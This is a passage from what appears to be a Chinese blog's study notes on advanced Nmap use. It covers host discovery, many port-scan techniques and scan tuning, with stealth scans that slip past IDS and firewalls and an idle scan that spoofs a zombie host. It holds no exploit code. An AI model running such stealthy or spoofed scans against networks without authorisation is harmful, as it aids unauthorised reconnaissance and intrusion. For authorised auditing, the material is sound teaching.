","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.1 目标列举 ​ 目标列举这里就是将CIDR类解析为IP地址列表，如果有域名的话，需要进行DNS解析将域名转化为IP地址。默认情况下, Nmap 会通过 resolv.conf 文件 (Unix)和注册表 (Win32) 来确定使用的DNS解析器，会向主机上配置的域名服务器进行解析IP地址。Nmap有两个功能选项支持控制DNS解析服务器，分别为--system-dns 和 --dns-servers \u003cserver1\u003e[,\u003cserver2\u003e[,...]]，推荐使用后者，原因后面再说。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:1","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.2 主机发现 ​ 主机发现默认使用多种ping 扫描技术探针同时探测，包括有：-PE -PS443 -PA80 -PP 选项。意味着对每个机器发送一个ICMP echo 请求，一个 TCP SYN 包，一个 TCP ACK 包，和一个 ICMP 时间戳请求包。如果是对私有地址，还会使用-PR，arp扫描进行探测。 ​ --packet-trace允许我们查看Nmap所发起的数据包流，我们可以通过这个选项来进行验证，如图： ​ 根据实验我们可以得出Nmap主机发现探测的顺序，任意探测收到目标主机的响应后将停止主机发现阶段，不在发送其他探针；对于未收到响应的主机，Nmap会进行1次重放，以防因网络因素引起的超时丢包等影响判断。对私有地址则会采用ARP进行探测。 ​ Nmap 支持多种主机发现技术，可以用 -h 查看 HOST DISCOVERY 字段，支持的技术选项有：-PS/PA/PU/PY，-PE/PP/PM，-PO，注意：如果你指定了任何 -P 选项，它会替换默认的发现探针，而不是在默认基础上增加新的探针类型。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:2","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.3 反向DNS解析 ​ Nmap会将存活主机列表传入这个阶段进行反向DNS解析，通过解析出的主机名称，用户可以推测该主机的用途，示例如下： ​ 从结果我们可以推测出，该IP是阿里的公共DNS服务器。 ​ 同时我们注意到，对一个IP的反向解析用时0.07s，如果是对多个IP这个时间将会更长，DNS解析会影响扫描时长。例如我对223.5.5.5-10共6个IP进行探测，在反向DNS解析上就需要花费2.63秒。 ​ 为什么1个IP只要0.07s，而6个却要2.63s，相差那么多？原因其实很简单，如果你了解DNS的解析过程就应该指定，当本地DNS解析不到，它会向其他DNS进行查询，223.5.5.5是一个相对知名的主机，很差很多DNS服务器都会有收录，解析就快，而其他IP就没有知名度，需要向其他DNS进行查询，Nmap需要等待第三方返回结果，耗时就大大增加了。 ​ 这里来解释一下--system-dns 和 --dns-servers \u003cserver1\u003e[,\u003cserver2\u003e[,...]]的区别，前者是限定使用系统DNS解析器，资源有限；而后者可以手动指定DNS服务器且允许多个，尤其是指定一些知名服务器时，解析速度会相对加快一些。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:3","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.4 端口扫描 ​ Nmap 默认的端口扫描技术是SYN探测，对应的选项是 -sS，这被称为TCP 半连接，原理网上自查，很多扫描器都会用这种方式进行探测，因此很多IDS都能检测到。其他端口扫描技术可见 nmap -h 中 SCAN TECHNIQUES 一节，它给出了技术名称，相信网上能搜到相应的技术原理。《Nmap Network Scanning》第五章：端口扫描技术和算法详细介绍了各种扫描技术及原理。 ​ Nmap 默认配置是扫描最常见的1000个端口，那么有没有人跟我一样好奇过这最常见的1000个端口到底是哪些端口呢？nmap-services文件中就记录着，https://nmap.org/book/nmap-services.html 给出了如何阅读和理解该文件，每一行表示在相应端口发现特定服务的可能性，Nmap的这个最常见的1000个就是基于这个文件得出的，我们也可以通过这个文件去统计一下各端口的频率，但是我没去做，所以我还是不知道最常见的1000个是哪些端口 😆 。 ​ 对于扫描的端口范围，Nmap提供了几个控制选项。 ​ -p选项，用户指定扫描范围，指定特定的端口，如 -p 80,443，nmap还支持指定协议名称去查询最可能出现的端口，如 -p http,https，Nmap会探测80，8008和433端口。同样也可以通过nmap-services文件查询。这里还支持通配符，例如-p *htttp，结果如下： ​ --exclude-ports 选项，排除特定端口，不进行扫描； ​ -F选项，fast模式，扫描最常见的100个端口； ​ -r 选项，控制端口从小到大依次进行扫描，而不是随机选择。 ​ --top-ports \u003cnumber\u003e 选项，扫描最常见的指定数量个端口。前 n 个端口是由 /usr/share/nmap/nmap-services文件确定的。有时候为了全面的目标主机的端口状态，会进行全端口扫描，以免遗漏攻击面。NNS一书第六章，优化Nmap性能：端口选择数据和策略中，给出了一张关于端口扫描数量和有效性的表格，TCP仅需扫描3328个端口就能达到99%的效率，UDP仅需15094个，而达到100%则需要65536全端口扫描。因此是为了保证准确率仅需全端口扫描，还是牺牲1点准确率换取更短的扫描时长，取决于个人选择。 ​ --port-ratio \u003cratio\u003e 选项，控制只扫描可能性大于指定ratio的端口，同样根据 nmap-services 文件统计数据。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:4","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.5 结果输出 ​ 默认结果是输出到命令行界面。其他对输出的控制选项有： 输出文件类型控制： ​ -oN 选项，以人类可读的普通模式（与命令行界面的输出结果一致）保存到指定文件中； ​ -oX 选项，输出为XML文件格式。因为XML的功能性，易与其他工具进行联动； ​ -oS 选项，输出为“脚本小子”格式（Script kiddie），输出内容会有大小写交叉，部分字母由其他符号代替；作者原话： It is simply a joke making fun of the script kiddies—they don’t actually use this mode (I hope). ​ -oG 选项，输出为适合Grep的格式，该格式更适合在Unix环境下使用Grep命令来获取数据。 ​ -oA 选项，同时输出Normal（-oN）、XML（-oX）、Grepable（-oG ）格式文件。 ​ Nmap的这些参数都支持在文件名中使用类似strftime的转换， %H, %M, %S, %m, %d, %y,和%Y 完全一致，%T 等同于 %H%M%S（时分秒），%R 等同于%H%M, ， %D 等同于 %m%d%y（月日年）。因此 -oX 'scan-%T-%D.xml' 会生成文件名为 scan-144840-121307.xml 的XML文件。 ​ Normal和Grepable格式的文件，支持中断扫描后继续扫描，命令为 nmap --resume \u003cfilename\u003e，XML文件输出不支持，原因是XML文件追加内容更难。 ​ –append-output 选项，在指定文件后面追加内容。上述的 -oN 之类选项默认会覆盖指定文件，当你想保留原文件，在后面附加新结果时，用这个选项。同样也不适合 -oX 选项，因为他会导致XML文件解析失败，需要手动修复。 输出信息控制 ​ -v 选项，显示详细信息，可以 -vv 或-v2 获取更详细信息； ​ -d 选项，显示调试信息，可以 -dd 或 -d2 获取更详细的调试信息； ​ –packet-trace 选项，显示数据包追踪； ​ 其他还有 –reason、–open、–iflist、–stylesheet、–webxml、-no-stylesheet ，可以查看nmap -h ，没什么要说明的内容。 命令行交互式控制 ​ 在扫描过程中，可以通过按键进行交互式控制，调整Nmap在命令行界面的输出信息。nmap运行时，所有按键都会被捕获。这允许您与程序交互而无需中止和重新启动它。某些特殊键将更改选项，而任何其他键将打印出一条状态消息，告诉您有关扫描的信息。通常是小写字母增加打印量，大写字母减少打印量。您也可以按“?”寻求帮助。 v/V 增加/减少详细程度输出，对应 -v选项功能 d/D 增大/减小调试级别，对应 -d选项功能 p/P 打开/关闭数据包跟踪，对应 --packet-trace 选项功能 ? 显示帮助信息 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:5","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"3.6 小结 ​ 回归到问题，Nmap 包含了哪些默认选项，如执行了哪些探测技术等？ ​ Nmap 1.1.1.1 包含的 -PE（ICMP Echo探测），-PS443（对443端口是SYN探测），-PA80（对80端口的ACK探测），-PP（ICMP 时间戳探测）主机发现技术，反向DNS解析技术，-sS（SYN探测）端口扫描技术扫描1000个端口，将结果输出到交互式命令行中。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:4:6","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x04 端口扫描技术 主机发现技术的原理不说了 Nmap的端口探测技术知道多少种，对应的原理是什么？有什么区别，分别适合什么场景？ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.1 -sS SYN扫描 ​ -sS SYN扫描，半连接扫描，优点是扫描速度快，不容易被记录，适用于任何兼容TCP堆栈，可以清晰可靠地区分端口开启、关闭和过滤状态。但需要root权限去构造原始数据包，目前IDS可以检测到这种扫描方式。 ​ 原理简单来说就是利用了TCP三次握手，向目标发送SYN数据包， ​ 若收到SYN/ACK返回，则端口开放，发送RST包终止建立连接（图5.2）； ​ 若收到RST返回包，则目标端口关闭（图5.3）； ​ 若目标无响应，则该端口可能被过滤（图5.4）。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:1","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.2 -sT TCP 连接扫描 ​ -sT TCP connect 连接扫描，建立完整的连接，会被日志、IDS等记录。 ​ 这通常是非高权限用户的默认扫描方式，Nmap会调用系统底层的connect与目标端口建立连接。一次完整的连接建立过程需要SYN、SYN/ACK、ACK、Data、RST 5个数据包，速度比SYN慢。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:2","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.3 -sA ACK扫描 ​ -sA ACK扫描，适合用来映射防火墙规则。 ​ ACK扫描不能确定端口为开发状态，可以用于映射防火墙规则集，确定是否有状态监测防火墙，以及对哪些端口进行了过滤。当扫描被过滤系统时，无论是开启或关闭的端口都会返回RST数据包，则Nmap会标记为 unfiltered ；若端口没有响应包或收到ICMP不可达报错，则标记为 filtered。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:3","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.4 -sW 窗口扫描 ​ -sW Windows扫描， ​ 窗口扫描原理与ACK扫描相同，但它会利用系统的实现细节区分端口开放和关闭，而不是都标记为 unfiltered。它会对RST数据包的TCP窗口值进行判断，若窗口字段为0，则该端口标记为closed，若端口字段非0，则标记为open。 ​ 这种扫描技术依赖于部分操作系统的特性，普遍性不高。某些系统开放的端口上窗口大小为正数，而关闭端口则为0。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:4","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.5 -sM Maimon扫描 ​ -sM Maimon扫描，以发现者Uriel Maimon命名，使用 FIN/ACK 数据包为探针。 ​ 根据RFC 793（TCP），无论端口是打开还是关闭都应生成RST数据包来响应此探测。但是，Uriel注意到，如果端口是开放的，则许多BSD派生的系统只会丢弃该数据包，Nmap借此确定打开的端口。若无响应包，则标记为 open|filtered ；若收到RST包，则端口为 closed；若收到ICMP不可达报错，则端口为 filtered。 ​ 不过在现代系统上很少出现这种错误，他们都将回复RST数据包，因此用处不大。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:5","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.6 -sU UDP扫描 ​ -sU UDP扫描，速度很慢，扫描上千个端口需要至少17分钟，多数Linux系统会限制 ICMP响应速率。 ​ UDP扫描会向指定的目标端口发送UDP数据包，对于大多数端口此数据包为空（无有效载荷），但对于一些常见端口，将发送特定协议的有效载荷数据包。根据响应包的存在与否，将端口分为四个状态： 目标端口的任何 UDP 响应 (异常) open 未收到返回信息 (即便重传) open|filtered ICMP 端口不可达错误 (type 3, code 3) closed 其他 ICMP 不可达错误 (type 3, code 1, 2, 9, 10, or 13) filtered ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:6","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.7 -sN/sF/sX Null扫描、FIN扫描、Xmas扫描 ​ -sN/sF/sX 设置TCP标志位。这三种扫描类型（以及–scanflags选项）利用TCP RFC 标准中的细节来区分开放端口和关闭端口，通常只能确定关闭的端口。 ​ 当目标主机符合RFC标准时，发送一个不包含SYN，RST，ACK标志的数据包，当目的端口关闭时将返回RST包，当端口开放时目标主机将丢弃数据包，因此无响应包，但也可能是防护设备导致无响应。因此只要不包含SYN、RST、ACK这三个位，则其他三个位（FIN，PSH和URG）的任何组合都可以。 ​ -sN 不设置任何标志位； ​ -sF 只设置TCP FIN位，FIN位表示关闭连接（finish）； ​ -sX 设置FIN、PSH和URG标志，PSH表示数据传输（push)，URG表示紧急（urgent）。 ​ 根据扫描结果，将端口分为三种状态，若无响应包，则标记端口状态为 open|filtered；若收到TCP RST包，则端口状态为 closed；若收到 ICMP不可达错误（type 3, code 1, 2, 9, 10, or 13)，则标记端口状态为 filtered。 ​ 这三种扫描优点在于可以规避部分非状态防火墙和包过滤路由设备，而且比SYN更加隐蔽；但缺点是并非所有的系统都遵循RFC 793标准，而且无法区分 open 和 filtered 端口。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:7","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.8 –scanflags 自定义扫描 ​ –scanflags 自定义扫描，可以定制化TCP标志位，原理同上。可以通过该选项设置 URG、ACK、PSH、RST、SYN 和 FIN 的任意组合，这种定制化可以用来研究绕过防火墙设备，这块没有研究，欢迎评论。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:8","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.9 -sI 空闲扫描 ​ -sI 空闲扫描，也有称之为僵尸扫描，利用僵尸主机进行扫描，优点是隐蔽性强，缺点是需要先找一台合适的僵尸主机。网上有文章。 ​ 首先我们需要知道： 确定TCP端口状态的一种方法是发送SYN数据包到该端口。若端口开放，则目标主机将响应 SYN / ACK（会话请求确认）数据包；若端口关闭，则目标主机将响应RST（重置）数据包。 收到未经请求的SYN / ACK数据包的计算机将以RST响应，未经请求的RST将被忽略。 每个IP数据包都有一个片段标识号（IP ID）。由于许多操作系统发送的每个数据包时只是增加此数字，因此探测IP ID可以告诉攻击者自上次探测以来已发送了多少个数据包。 ​ 通过组合这些特点，可以伪造您的身份，同时扫描目标网络，从而看起来像是无辜的僵尸机器进行了扫描。简单来说，空闲扫描技术主要是进行下面三步： 探测僵尸的IP ID并将其记录下来。 伪造来自僵尸的SYN数据包，并将其发送到目标主机的端口上。根据端口状态，目标的反应可能会导致僵尸的IP ID增加。 再次探测僵尸主机的IP ID。然后，通过将此新IP ID与步骤1中记录的IP ID进行比较来确定目标端口状态。若ID加2，则端口开放。 ​ 这项技术的难点在于如何找到一台合适的僵尸主机。若僵尸主机比较活跃，则IP ID序列号将不准确，无法判断端口状态。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:9","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.10 -sY/sZ SCTP INIT/COOKIE-ECHO扫描 ​ -sY/sZ SCTP INIT/COOKIE-ECHO扫描，这两种扫描方式是基于SCTP协议。 ​ SCTP（Stream Control Transmission Protocol，流控制传输协议）是IETF（Internet Engineering Task Force）在2000年定义的一个传输层协议。SCTP可以看作是TCP协议的改进，它改进了TCP的一些不足。它一种提供了可靠、高效、有序的数据传输协议。相比之下TCP是面向字节的，而SCTP是针对成帧的消息。RFC 4960详细地定义了SCTP，介绍性的文档是RFC 3286。 ​ TCP建立连接的过程是：SYN、SYN/ACK、ACK； ​ 而SCTP建立连接的过程是：INIT、INIT-ACK、COOKIE-ECHO、COOKIE-ACK ​ 主机发现阶段的 -PY 选项与 -sY 原理一样，通过向目标主机的指定端口发送 INIT数据包，根据主机响应判断是否存活。 ​ -sY/sZ 与TCP协议下的 -sS/sA，思想是一致的。 -sY SCTP INIT扫描是TCP SYN扫描的SCTP等效物。优点是速度快，不受限制性防火墙的限制。与SYN扫描一样，INIT扫描相对隐蔽，因为它永远不会完成SCTP连接。能有效区分开启，关闭和过滤状态。 ​ -sZ SCTP COOKIE-ECHO扫描，利用了SCTP协议在实现上，若向开放的端口发送COOKIE-ECHO请求，则该端口会直接丢弃该数据包不做响应；而对关闭的端口，则目标主机会返回ABORT响应。同样也可以用于检测基于状态检测的防火墙。缺点是不能区分打开和过滤的端口。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:10","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.11 -sO 协议扫描 ​ -sO IP层协议扫描，这不算是端口扫描技术，该扫描技术用于判断目标主机所支持的协议。 ​ 该扫描技术允许用户通过-p选择扫描的协议号，也可以使用-F扫描nmap-protocols文件中的所有协议（共145种协议），默认情况下会扫描256个可能的值，以常规端口表格形式报告结果。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:11","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.12 -b FTP bounce scan ​ -b FTP bounce scan，逐渐弃用 ​ 这种扫描技术是利用FTP服务器的功能。FTP协议（RFC 959）的一个有趣功能是支持所谓的代理FTP连接。这使用户可以连接到一个FTP服务器，然后要求将文件发送到第三方服务器。在许多级别上，这种功能已经很容易被滥用，其中之一是导致FTP服务器对其他主机进行端口扫描。因此大多数FTP服务器都不再支持该功能，所以这项扫描技术也基本弃用了。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:12","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"4.13 组合利用 ​ 有时候需要通过多种扫描技术来对确定端口状态。例如： ​ 先执行FIN扫描，Nmap会找到关闭的端口，同时列出 39个端口为“open|filtered”；然后再对这39个端口进行ACK扫描，其中有2个为filtered，其他37个处于未过滤状态意味着open或closed。如果一种扫描类型将端口标识为open或filtered ，另一种扫描类型将其标识为open或closed，那么该端口必须为打开状态。通过组合这两种扫描类型，我们了解到有37个端口开放，两个已过滤，而961已关闭。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:5:13","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x05 Nmap高效扫描策略 ​ Nmap的扫描速度慢一直被人诟病，首先分析一下Nmap扫描慢可能的原因，再根据NNS 第六章 优化Nmap表现和平时的使用心得给出一些建议。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:0","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.1 Nmap慢在哪？ ​ Nmap扫描的慢，一部分是因为其扫描算法，另一部分是部分高级功能的原因。以下是我认为可能导致Nmap慢的原因： 网络状态监测（拥塞控制） Nmap提供网络状态监测，Nmap会基于网络状态适当的调整扫描速度，以保持网络允许的速度。Nmap 使用三种模仿 TCP 的算法来控制扫描的激进程度：拥塞窗口、指数退避和慢启动。拥塞窗口控制 Nmap 一次可能有多少个未完成的探测。若窗口已满，则不再发送，直到收到响应或探测超时。当 Nmap 检测到丢弃的数据包时，指数退避会导致 Nmap 显着变慢。每当检测到丢弃时，拥塞窗口通常会减少到 1。慢启动则用于逐渐提高扫描速度以确定网络的性能限制。 拥塞窗口和阈值： 自适应重传 最简单的扫描仪（和无状态的） 通常根本不重传探测。如果没有检测到丢包，Nmap 可能只在收到探测响应失败时重传一次。当出现大量丢包现象时，Nmap 可能会重传十次或更多次。这允许 Nmap 快速扫描快速、可靠网络上的主机，同时在扫描有问题的网络或机器时保持准确性（以牺牲一些速度为代价）。当达到某个阈值时，Nmap才会放弃重传。 扫描延迟 数据包响应速率限制可能是 Nmap 等端口扫描器面临的最严重的问题。当目标主机存在数据包响应速率限制时，Nmap会试图检测这种情况，启用扫描延迟，它会在发送到单个目标的每个探测之间实现短延迟（低至 5 毫秒）。如果数据包响应速率依然在下降，Nmap 将继续将延迟加倍，直到下降停止或 Nmap 达到允许的最大扫描延迟。 DNS解析功能 ​ Nmap提供DNS解析和反向DNS解析功能。通常正向DNS解析速度很快，但反向DNS解析需要耗费很长时间，尤其是对大量目标进行探测时，反向DNS解析过程会花费大量时间。 服务版本探测 ​ 端口扫描是Nmap的核心功能，同时Nmap还提供对所发现的端口进行服务版本探测。在这一环节需要发送大量的数据包来确定服务版本。在这个阶段Nmap会与TCP端口建立连接并监听该端口服务约5秒，以期望在目标端口服务的欢迎标语banner中获取信息，并与nmap-service-probes文件指纹进行匹配；但若未能匹配，则需要使用其他探针去诱导获取指纹。 …… ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:1","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.2 方法论技巧 保持版本更新 选择有利的网络位置 ​ 我的理解有两个方面，一是选一个网络环境好的地方，减少超时重放等现象； ​ 第二个是从防火墙后面扫，能够从内网扫描就不要从公网扫描，中间少一些路由防火墙等网络设备，这样数据更全面且准确。 ​ 当然很多时候我们没有选择的余地。 多阶段扫描 ​ 如果计划进行全面的安全审核，对全端口进行扫描，我可能会考虑先对给定资产范围进行一次快速的扫描，如nmap -n -F \u003ctargets\u003e；同时后台进行忽略主机存活状态的全端口探测，如nmap -Pn -n \u003ctargets\u003e -p-。 并发进行Nmap扫描 ​ 在同一台主机上运行多个Nmap进程，将大任务进行分解。官方说五个或十个都还好，启动太多并发任务容易导致资源竞争。 ​ 另一种并行方式是在不同主机上运行。 ​ 例如：需要扫一个B段，那就是256个C段，我可能会考虑将任务分为在本地移动办公的终端上运行1个C段，在远程主机上运行3个C段+64个*3+60个，这么6个任务。 分离和优化UDP扫描 ​ Nmap虽然支持 -sSU，但在注重性能时不建议结合使用TCP和UDP扫描。因为UDP扫描通常会很慢。所以建议分开进行。 ​ 由于UDP端口扫描技术的特殊性，open和filtered的端口都不会发送响应包，因此需要时间去等待；而无响应包的情况为了排除因网络原因导致的丢包还需要进行重传确认。而对于关闭的端口，会收到ICMP端口不可达，部分系统会限制 ICMP 消息发送速率。因此UDP扫描会很慢。 ​ 官方也给出了一些改善UDP扫描性能的建议，整体上与本章其他内容想法相同。增加主机并行数（–min-hostgroup）同时扫描多个主机；优先扫描常见端口-F；版本探测时，指定 –version-intensity 0 仅尝试最有可能针对给定端口号有效的探针；从防火墙后扫描；–host-timeout 指定主机超时时间，跳过响应缓慢的主机；最后一条，保持冷静，做点别的，不要盯着进度条，眼不见心不烦（/doge/） 忽略非关键测试。明确测试目的 ​ 首先需要想清楚我们的测试目的，明确测试目的后对任务进行划分，选取扫描策略，指定参数选项。 例如： ​ 如果你只需探测网络内存活主机，就没必要进行端口扫描，用-sn禁用端口扫描； ​ **限制扫描的端口数。**当遇到速率限制和无响应时，Nmap扫描速率会下降，绝大数主机只会开发几百个端口，如果仅扫描100个端口而不是默认的1000个端口，则端口扫描的速度大约是其10倍。全端口扫描的100%准确率与–top-ports 3328 的99%准确率的取舍。 ​ 跳过高级扫描类型。 -A 选项会同时开启脚本探测 -sC，版本探测-sV，操作系统探测 -O和路由跟踪–traceroute，确定这些功能是否都需要开启；当针对大规模网络进行扫描时，这些高级功能会花费很长的时间，建议跳过-sC -sV，然后根据需要在各端口上执行他们。至于操作系统探测和路由跟踪，绝大部分时候可能并不在意。作为一种折衷方法，您可以指定–osscan-limit –max-os-tries 1，来告诉Nmap不要重试无法匹配的操作系统，并对没有开放至少一个TCP端口和一个关闭的TCP端口的任何主机跳过操作系统检测。 ​ **不必要时关闭DNS解析。**Nmap默认会主机进行反向DNS解析，尤其是使用-Pn和-R时，会对所有主机执行此操作，这会花费很多时间。可以使用 --dns-servers 指定DNS服务器来加速这一过程。不过，在不必要时，建议使用-n禁用DNS解析。对于针对大量主机的简单扫描（例如ping扫描），省略DNS有时可以将扫描时间减少20％或更多。 ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:2","tags":["Tools","Pentest"],"title":"002-Nmap进阶学习心得","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.3 Nmap选项技巧 加速选项控制。 nmap -h 中 TIMING AND PERFORMANCE 部分的选项可以帮到很多。 –min-hostgroup, –max-hostgroup 可指定最小和最大主机组大小，影响并发扫描主机速率。 –min-parallelism, –max-parallelism 可指定最小和最大并发运行的探针数量 –min-rtt-timeout, –max-rtt-timeout, –initial-rtt-timeout 可指定最小、最大和初始化探针超时值，需写上单位，通常为毫秒ms。Nmap 